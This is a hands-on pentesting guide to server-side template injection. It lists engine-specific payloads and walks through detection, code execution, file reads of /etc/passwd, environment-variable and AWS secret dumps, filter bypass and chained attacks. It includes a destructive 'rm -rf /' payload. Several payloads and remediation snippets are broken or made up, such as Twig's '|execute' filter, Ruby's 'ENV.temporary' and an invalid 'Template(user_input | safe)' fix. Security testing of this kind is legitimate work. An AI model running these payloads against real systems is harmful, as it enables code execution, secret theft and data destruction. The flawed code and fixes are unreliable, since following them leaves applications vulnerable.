# Testing for Server-Side Template Injection Vulnerabilities

## Overview

Testing for Server-Side Template Injection (SSTI) vulnerabilities involves verifying that a web application properly sanitizes user input processed by server-side template engines (e.g., Jinja2, Twig, Freemarker) to prevent attackers from executing arbitrary code, accessing sensitive files, or manipulating server logic. According to OWASP (WSTG-INPV-018), SSTI occurs when untrusted input is embedded into templates without proper escaping, allowing attackers to inject malicious template expressions that execute on the server. This guide provides a hands-on methodology to test for SSTI vulnerabilities, focusing on identifying template injection points, basic injection, code execution, file access, environment variable exposure, filter bypass, and chained attacks, with tools, commands, payloads, and remediation strategies.

**Impact**: Server-Side Template Injection vulnerabilities can lead to:
- Remote code execution (RCE) on the server.
- Unauthorized access to sensitive files or environment variables.
- Application logic bypass or data exposure.
- Denial of service (DoS) through resource exhaustion.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as SSTI attacks may execute code, access sensitive data, or disrupt server operations, potentially causing significant harm.

## Testing Tools

The following tools are recommended for testing Server-Side Template Injection vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to inject template payloads.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify injection points.
  - **Note**: Use “Intruder” for payload fuzzing.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with custom SSTI rules; manually verify findings due to false positives.

- **cURL and HTTPie**: Send HTTP requests with template injection payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/page?name={{7*7}}"
      # HTTPie
      http "http://example.com/page?name={{7*7}}"
      ```

- **Postman**: GUI tool for testing template payloads in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to template payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Console tab for output.
  - **Note**: Firefox’s 2025 response inspection enhancements improve debugging.

- **Netcat (nc)**: Tests raw HTTP requests with custom payloads.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /page?name={{7*7}} HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-018, testing Server-Side Template Injection vulnerabilities across template injection points, basic injection, code execution, file access, environment variable exposure, filter bypass, and chained attacks.

### Common Server-Side Template Injection Payloads

Below is a list of common payloads to test for SSTI vulnerabilities. Start with simple payloads to detect the template engine, then escalate to advanced payloads. Use with caution in controlled environments to avoid unintended code execution or server disruption.

- **Basic Injection Payloads** (Detect Template Engine):
  - `{{7*7}}` (Jinja2, Twig: Outputs `49`)
  - `${7*7}` (Freemarker, Velocity: Outputs `49`)
  - `<%= 7*7 %>` (ERB, JSP: Outputs `49`)
  - `#{7*7}` (Ruby ERB: Outputs `49`)

- **Code Execution Payloads**:
  - Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}` (Executes `whoami`)
  - Twig: `{{_self.env.registerUndefinedFilterCallback('exec')(_self.env.getFilter('whoami'))}}` (Executes `whoami`)
  - Freemarker: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}` (Executes `whoami`)
  - ERB: `<%= system('whoami') %>` (Executes `whoami`)

- **File Access Payloads**:
  - Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[407]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}`
  - Freemarker: `<#include "/etc/passwd">`
  - Twig: `{{include('/etc/passwd')}}`
  - Velocity: `#set($x=$runtime.getClass().forName('java.io.File').newInstance('/etc/passwd').text)$x`

- **Environment Variable Exposure Payloads**:
  - Jinja2: `{{''.__class__.__mro__[1].__subclasses__()[407]('env', shell=True, stdout=-1).communicate()}}`
  - Freemarker: `${"java.lang.System"::getenv("AWS_SECRET_KEY")}`
  - Twig: `{{app.request.server.get('AWS_SECRET_KEY')}}`
  - ERB: `<%= ENV['AWS_SECRET_KEY'] %>`

- **Filter Bypass Payloads**:
  - Jinja2: `{{7*'7'}}` (Bypasses numeric filters, outputs `7777777`)
  - Twig: `{{'malicious'|filter('exec')}}` (Bypasses filter restrictions)
  - Freemarker: `<#assign x='malicious'?eval>${x}` (Evaluates string)
  - Velocity: `#set($x='malicious'$x)` (Dynamic evaluation)

- **Chained Attack Payloads**:
  - Jinja2 + XSS: `{{'<script>alert(1)</script>'|safe}}`
  - Freemarker + SSRF: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('curl http://internal:8080')}`
  - Twig + SQLi: `{{'1; DROP TABLE users'|execute}}`
  - ERB + Command Injection: `<%= system('whoami; rm -rf /') %>`

**Note**: Payloads are engine-specific (e.g., Jinja2, Twig). Identify the template engine first using basic payloads, then use targeted payloads. Test in query parameters, form fields, or JSON payloads where templates are processed.

### 1. Identify Template Injection Points

**Objective**: Locate inputs processed by server-side template engines.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify forms, URLs, or APIs that display user input (e.g., user profiles, search results, error pages).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or click links to capture requests in HTTP History.
   - Note parameters (e.g., `name=test`, `query=search`).
3. Inspect responses:
   - Check for dynamic content or template syntax (e.g., `{{`, `${`).
   - Use Developer Tools (`Ctrl+Shift+I`) to analyze output.
4. List injection points:
   - Document query strings, form fields, headers, and JSON payloads.

**Example Injection Points**:
- URL: `http://example.com/profile?name=test`
- Form: `<input name="message">`
- API: `POST /api/render` with `{"template": "test"}`

**Remediation**:
- Escape user input:
  ```python
  from jinja2 import escape
  template = escape(user_input)
  ```
- Use safe rendering:
  ```python
  env = Environment(autoescape=True)
  ```

**Tip**: Save the injection point list in a report.

### 2. Test for Basic Template Injection

**Objective**: Verify if user input is processed by a template engine.

**Steps**:
1. Identify input fields:
   - Look for parameters like `?name=test`.
2. Inject basic payloads:
   - Use Burp Repeater:
     ```http
     GET /profile?name={{7*7}} HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/profile?name={{7*7}}"
     ```
3. Check responses:
   - Look for `49` (indicates Jinja2/Twig).
   - Test: `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
4. Test variations:
   - Try: `{{7*'7'}}` for filter detection.

**Example Vulnerable Code (Python/Jinja2)**:
```python
from jinja2 import Template
user_input = request.args.get('name')
template = Template(user_input)
return template.render()
```
Test: `?name={{7*7}}`
Result: Outputs `49`.

**Example Secure Code (Python/Jinja2)**:
```python
from jinja2 import Template, escape
user_input = escape(request.args.get('name'))
template = Template("Hello, {{ name }}!")
return template.render(name=user_input)
```
Test: No injection.

**Remediation**:
- Sanitize input:
  ```python
  user_input = escape(user_input)
  ```
- Use static templates:
  ```python
  template = Template("Hello, {{ name }}")
  ```

**Tip**: Save template engine evidence in a report.

### 3. Test for Code Execution

**Objective**: Check if template injection allows remote code execution.

**Steps**:
1. Inject code execution payloads:
   - Test (Jinja2): `{{''.__class__.__mro__[1].__subclasses__()[407]('whoami', shell=True, stdout=-1).communicate()}}`
   - Use Burp:
     ```http
     GET /profile?name={{''.__class__.__mro__[1].__subclasses__()[407]('whoami',shell=True,stdout=-1).communicate()}} HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for command output (e.g., `whoami` result).
   - Test engine-specific payloads (Twig, Freemarker, ERB).
3. Escalate payloads:
   - Try: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}`.
4. Use Postman for APIs:
   - Send: `{"name": "{{''.__class__.__mro__[1].__subclasses__()[407]('whoami',shell=True,stdout=-1).communicate()}}"}`.

**Example Vulnerable Code (PHP/Twig)**:
```php
$template = new Twig\Environment(new Twig\Loader\ArrayLoader(['page' => $_GET['template']]));
echo $template->render('page');
```
Test: `?template={{_self.env.registerUndefinedFilterCallback('exec')(_self.env.getFilter('whoami'))}}`
Result: Executes `whoami`.

**Example Secure Code (PHP/Twig)**:
```php
$loader = new Twig\Loader\FilesystemLoader('templates');
$twig = new Twig\Environment($loader, ['autoescape' => 'html']);
echo $twig->render('page.html', ['name' => htmlspecialchars($_GET['name'])]);
```
Test: No execution.

**Remediation**:
- Disable dangerous functions:
  ```python
  env = Environment(extensions=[]) # No unsafe extensions
  ```
- Sandbox templates:
  ```php
  $twig->setSandboxPolicy(new Twig\Sandbox\SecurityPolicy());
  ```

**Tip**: Save code execution evidence in a report.

### 4. Test for File Access

**Objective**: Verify if template injection allows unauthorized file access.

**Steps**:
1. Inject file access payloads:
   - Test (Jinja2): `{{''.__class__.__mro__[1].__subclasses__()[407]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}`
   - Use cURL:
     ```bash
     curl -i "http://example.com/profile?name={{''.__class__.__mro__[1].__subclasses__()[407]('cat%20/etc/passwd',shell=True,stdout=-1).communicate()}}"
     ```
2. Check responses:
   - Look for file contents (e.g., `/etc/passwd`).
   - Test: `<#include "/etc/passwd">` (Freemarker).
3. Test other files:
   - Try: `/proc/self/environ`, `../config/db.conf`.
4. Use Netcat for raw requests:
   ```bash
   echo -e "GET /profile?name={{''.__class__.__mro__[1].__subclasses__()[407]('cat%20/etc/passwd',shell=True,stdout=-1).communicate()}} HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
   ```

**Example Vulnerable Code (Java/Velocity)**:
```java
VelocityContext context = new VelocityContext();
context.put("input", request.getParameter("input"));
Template template = Velocity.getTemplate(request.getParameter("input"));
template.merge(context, writer);
```
Test: `#set($x=$runtime.getClass().forName('java.io.File').newInstance('/etc/passwd').text)$x`
Result: Reads `/etc/passwd`.

**Example Secure Code (Java/Velocity)**:
```java
VelocityContext context = new VelocityContext();
context.put("input", StringEscapeUtils.escapeHtml4(request.getParameter("input")));
Template template = Velocity.getTemplate("static.vm");
template.merge(context, writer);
```
Test: No file access.

**Remediation**:
- Restrict file access:
  ```python
  env = Environment(loader=FileSystemLoader('templates', followlinks=False))
  ```
- Validate input:
  ```java
  if (!input.matches("^[a-zA-Z0-9]+$")) throw new IllegalArgumentException();
  ```

**Tip**: Save file access evidence in a report.

### 5. Test for Environment Variable Exposure

**Objective**: Check if template injection exposes sensitive environment variables.

**Steps**:
1. Inject env variable payloads:
   - Test (Jinja2): `{{''.__class__.__mro__[1].__subclasses__()[407]('env', shell=True, stdout=-1).communicate()}}`
   - Use Burp:
     ```http
     GET /profile?name={{''.__class__.__mro__[1].__subclasses__()[407]('env',shell=True,stdout=-1).communicate()}} HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for variables (e.g., `AWS_SECRET_KEY`).
   - Test: `${"java.lang.System"::getenv("AWS_SECRET_KEY")}` (Freemarker).
3. Test specific variables:
   - Try: `PATH`, `DATABASE_URL`.
4. Use Postman for APIs:
   - Send: `{"name": "{{''.__class__.__mro__[1].__subclasses__()[407]('env',shell=True,stdout=-1).communicate()}}"}`.

**Example Vulnerable Code (Ruby/ERB)**:
```ruby
require 'erb'
template = ERB.new(params[:template])
puts template.result
```
Test: `<%= ENV['AWS_SECRET_KEY'] %>`
Result: Exposes `AWS_SECRET_KEY`.

**Example Secure Code (Ruby/ERB)**:
```ruby
require 'erb'
template = ERB.new("Hello, <%= name %>")
puts template.result_with_hash(name: ERB::Util.html_escape(params[:name]))
```
Test: No exposure.

**Remediation**:
- Limit env access:
  ```ruby
  ENV.temporary = false
  ```
- Escape input:
  ```ruby
  name = CGI.escapeHTML(params[:name])
  ```

**Tip**: Save variable exposure evidence in a report.

### 6. Test for Filter Bypass

**Objective**: Verify if template engine filters can be bypassed.

**Steps**:
1. Inject bypass payloads:
   - Test (Jinja2): `{{7*'7'}}`
   - Use cURL:
     ```bash
     curl -i "http://example.com/profile?name={{7*'7'}}"
     ```
2. Check responses:
   - Look for output like `7777777`.
   - Test: `{{'malicious'|filter('exec')}}` (Twig).
3. Test obfuscation:
   - Try: `<#assign x='malicious'?eval>${x}` (Freemarker).
4. Use Burp Intruder:
   - Fuzz with bypass payloads.

**Example Vulnerable Code (Python/Jinja2)**:
```python
from jinja2 import Template
user_input = request.args.get('name')
if 'class' not in user_input:
    template = Template(user_input)
    return template.render()
```
Test: `{{7*'7'}}`
Result: Outputs `7777777`.

**Example Secure Code (Python/Jinja2)**:
```python
from jinja2 import Template, escape
user_input = escape(request.args.get('name'))
template = Template("Hello, {{ name }}")
return template.render(name=user_input)
```
Test: No bypass.

**Remediation**:
- Strict filtering:
  ```python
  if not user_input.isalnum(): raise ValueError("Invalid input")
  ```
- Use safe filters:
  ```python
  template = Template(user_input | safe)
  ```

**Tip**: Save bypass evidence in a report.

### 7. Test for Chained Attacks

**Objective**: Check if SSTI can be combined with other vulnerabilities.

**Steps**:
1. Inject chained payloads:
   - Test (Jinja2 + XSS): `{{'<script>alert(1)</script>'|safe}}`
   - Use Burp:
     ```http
     GET /profile?name={{'<script>alert(1)</script>'|safe}} HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for XSS, SSRF, or injection.
   - Test: `{{'1; DROP TABLE users'|execute}}` (Twig + SQLi).
3. Test other vulnerabilities:
   - Try: `<#assign ex='freemarker.template.utility.Execute'?new()>${ex('curl http://internal:8080')}` (Freemarker + SSRF).
4. Use Netcat for raw requests:
   ```bash
   echo -e "GET /profile?name={{'<script>alert(1)</script>'|safe}} HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
   ```

**Example Vulnerable Code (PHP/Twig)**:
```php
$template = new Twig\Environment(new Twig\Loader\ArrayLoader(['page' => $_GET['template']]));
echo $template->render('page');
```
Test: `?template={{'<script>alert(1)</script>'|safe}}`
Result: Executes XSS.

**Example Secure Code (PHP/Twig)**:
```php
$loader = new Twig\Loader\FilesystemLoader('templates');
$twig = new Twig\Environment($loader, ['autoescape' => 'html']);
echo $twig->render('page.html', ['name' => htmlspecialchars($_GET['name'])]);
```
Test: No XSS.

**Remediation**:
- Combine defenses:
  ```php
  $name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
  $twig->setSandboxPolicy(new Twig\Sandbox\SecurityPolicy());
  ```
- Implement CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
  ```

**Tip**: Save chained attack evidence in a report.